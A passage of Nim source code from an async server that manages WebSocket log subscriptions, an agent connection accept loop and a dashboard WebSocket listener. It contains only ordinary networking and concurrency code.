            if frame.len == 0: break
        except: discard
        finally:
          {.cast(gcsafe).}:
            acquire(logSubsLock)
            if aid in logSubs:
              var newList: seq[AsyncSocket] = @[]
              for s in logSubs[aid]:
                if s != sock: newList.add(s)
              logSubs[aid] = newList
            release(logSubsLock)
          try: sock.close()
          except: discard
      else:
        try: sock.close()
        except: discard
    else:
      try: await sock.send("HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
      except: discard
      try: sock.close()
      except: discard

  # Agent listener loop, as a separate async task
  proc agentAcceptLoop() {.async, gcsafe.} =
    while true:
      try:
        let c = await srv.accept()
        {.cast(gcsafe).}:
          asyncCheck handleAgent(c)
      except: discard

  # Dashboard WS listener loop, as a separate async task
  proc wsDashLoop() {.async, gcsafe.} =
    let wsSrv = newAsyncSocket()
    wsSrv.setSockOpt(OptReuseAddr, true)
    wsSrv.bindAddr(Port(WS_DASH_PORT), LISTEN_HOST)
    wsSrv.listen()
    echo "[" & BuildPrefix & " *] Dashboard WS on ws://", LISTEN_HOST, ":", WS_DASH_PORT
    while true:
      try:
        let (a, s) = await wsSrv.acceptAddr()
        {.cast(gcsafe).}:
          asyncCheck wsDashAccept(s)
      except: discard

  asyncCheck agentAcceptLoop()
  asyncCheck wsDashLoop()

  # Park forever — the accept loops above do all the work.
  while true:
    await sleepAsync(60_000)

when isMainModule:
  asyncCheck main()
  runForever()
